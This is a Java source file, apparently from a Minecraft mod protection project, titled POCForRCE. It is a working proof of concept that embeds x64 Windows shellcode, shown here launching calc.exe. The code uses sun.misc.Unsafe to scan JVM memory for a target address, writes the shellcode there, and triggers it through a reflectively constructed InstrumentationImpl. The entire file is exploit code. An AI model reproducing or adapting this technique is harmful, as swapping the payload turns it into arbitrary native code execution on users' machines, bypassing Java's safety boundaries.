package com.netease.mc.modSS.protecter.debugger;

import sun.misc.*;
import java.lang.instrument.*;
import java.util.*;
import java.lang.reflect.*;

public class POCForRCE
{
    public static void main(final String[] args) throws Throwable {
        final byte[] buf = { 65, 72, -125, -28, -16, -24, -64, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, -46, 101, 72, -117, 82, 96, 72, -117, 82, 24, 72, -117, 82, 32, 72, -117, 114, 80, 72, 15, -73, 74, 74, 77, 49, -55, 72, 49, -64, -84, 60, 97, 124, 2, 44, 32, 65, -63, -55, 13, 65, 1, -63, -30, -19, 82, 65, 81, 72, -117, 82, 32, -117, 66, 60, 72, 1, -48, -117, -128, -120, 0, 0, 0, 72, -123, -64, 116, 103, 72, 1, -48, 80, -117, 72, 24, 68, -117, 64, 32, 73, 1, -48, -29, 86, 72, -1, -55, 65, -117, 52, -120, 72, 1, -42, 77, 49, -55, 72, 49, -64, -84, 65, -63, -55, 13, 65, 1, -63, 56, -32, 117, -15, 76, 3, 76, 36, 8, 69, 57, -47, 117, -40, 88, 68, -117, 64, 36, 73, 1, -48, 102, 65, -117, 12, 72, 68, -117, 64, 28, 73, 1, -48, 65, -117, 4, -120, 72, 1, -48, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, -125, -20, 32, 65, 82, -1, -32, 88, 65, 89, 90, 72, -117, 18, -23, 87, -1, -1, -1, 93, 72, -70, 1, 0, 0, 0, 0, 0, 0, 0, 72, -115, -115, 1, 1, 0, 0, 65, -70, 49, -117, 111, -121, -1, -43, -69, -16, -75, -94, 86, 65, -70, -90, -107, -67, -99, -1, -43, 72, -125, -60, 40, 60, 6, 124, 10, -128, -5, -32, 117, 5, -69, 71, 19, 114, 111, 106, 0, 89, 65, -119, -38, -1, -43, 99, 97, 108, 99, 46, 101, 120, 101, 0 };
        Unsafe unsafe = null;
        try {
            final Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe)field.get(null);
        }
        catch (Exception e) {
            throw new AssertionError((Object)e);
        }
        final long size = buf.length + 376;
        long allocateMemory = unsafe.allocateMemory(size);
        System.out.println("allocateMemory:" + Long.toHexString(allocateMemory));
        final Map map = new HashMap();
        map.put("X", "y");
        final POCForRCE poc = new POCForRCE();
        for (int i = 0; i < 10000; ++i) {
            poc.b(33);
        }
        Thread.sleep(2000L);
        for (int k = 0; k < 10000; ++k) {
            unsafe.allocateMemory(16384L);
        }
        long shellcodeBed = 0L;
        final int offset = 4;
        for (int j = -4096; j < 4096; ++j) {
            final long target = unsafe.getAddress(allocateMemory + j * offset);
            System.out.println("start get " + Long.toHexString(allocateMemory + j * offset) + ",adress:" + Long.toHexString(target) + ",now j is :" + j);
            if (target % 8L <= 0L) {
                if (target > (allocateMemory & 0xFFFFFFFF00000000L) && target < (allocateMemory | 0xFFFFFFL)) {
                    if ((target & 0xFFFFFFFFFF000000L) != (allocateMemory & 0xFFFFFFFFFF000000L)) {
                        if (Long.toHexString(target).indexOf("000000") > 0 || Long.toHexString(target).endsWith("bebeb0") || Long.toHexString(target).endsWith("abebeb")) {
                            System.out.println("maybe error address,skip " + Long.toHexString(target));
                        }
                        else {
                            System.out.println("BYTE:" + unsafe.getByte(target));
                            if (unsafe.getByte(target) == 85 || unsafe.getByte(target) == 232 || unsafe.getByte(target) == -96 || unsafe.getByte(target) == 72 || unsafe.getByte(target) == 102) {
                                System.out.println("get address:" + Long.toHexString(target) + ",at :" + Long.toHexString(allocateMemory - j * offset) + ",BYTE:" + Long.toHexString(unsafe.getByte(target)));
                                shellcodeBed = target;
                                break;
                            }
                        }
                    }
                }
            }
        }
        if (shellcodeBed == 0L) {
            for (int j = -256; j < 2048; ++j) {
                final long target = unsafe.getAddress(allocateMemory + j * offset);
                System.out.println("start get " + Long.toHexString(allocateMemory + j * offset) + ",adress:" + Long.toHexString(target) + ",now j is :" + j);
                if (target % 8L <= 0L) {
                    if (target > (allocateMemory & 0xFFFFFFFF00000000L) && target < (allocateMemory | 0xFFFFFFFFL)) {
                        if ((target & 0xFFFFFFFFFF000000L) != (allocateMemory & 0xFFFFFFFFFF000000L)) {
                            if (Long.toHexString(target).indexOf("0000000") > 0 || Long.toHexString(target).endsWith("bebeb0") || Long.toHexString(target).endsWith("abebeb")) {
                                System.out.println("maybe error address,skip " + Long.toHexString(target));
                            }
                            else {
                                System.out.println("BYTE:" + unsafe.getByte(target));
                                if (unsafe.getByte(target) == 85 || unsafe.getByte(target) == 232 || unsafe.getByte(target) == -96 || unsafe.getByte(target) == 72) {
                                    System.out.println("get bigger cache address:" + Long.toHexString(target) + ",at :" + Long.toHexString(allocateMemory - j * offset) + ",BYTE:" + Long.toHexString(unsafe.getByte(target)));
                                    shellcodeBed = target;
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        System.out.println("find address end,address is " + Long.toHexString(shellcodeBed) + " mod 8 is:" + shellcodeBed % 8L);
        String address = "";
        allocateMemory = shellcodeBed;
        address = allocateMemory + "";
        final Class cls = Class.forName("sun.instrument.InstrumentationImpl");
        final Constructor constructor = cls.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        final Object obj = constructor.newInstance(Long.parseLong(address), true, true);
        final Method redefineMethod = cls.getMethod("redefineClasses", ClassDefinition[].class);
        final ClassDefinition classDefinition = new ClassDefinition(Class.class, new byte[0]);
        final ClassDefinition[] classDefinitions = { classDefinition };
        try {
            unsafe.putLong(allocateMemory + 8L, allocateMemory + 16L);
            unsafe.putLong(allocateMemory + 8L + 8L, allocateMemory + 16L);
            unsafe.putLong(allocateMemory + 16L + 360L, allocateMemory + 16L + 360L + 8L);
            for (int l = 0; l < buf.length; ++l) {
                unsafe.putByte(allocateMemory + 16L + 360L + 8L + l, buf[l]);
            }
            redefineMethod.invoke(obj, classDefinitions);
        }
        catch (Exception e2) {
            e2.printStackTrace();
        }
    }
    
    private int a(final int x) {
        if (x > 1) {}
        return x * 1;
    }
    
    private void b(final int x) {
        if (this.a(x) > 1) {
            this.a(x);
        }
        else {
            this.a(x + 4);
        }
    }
}
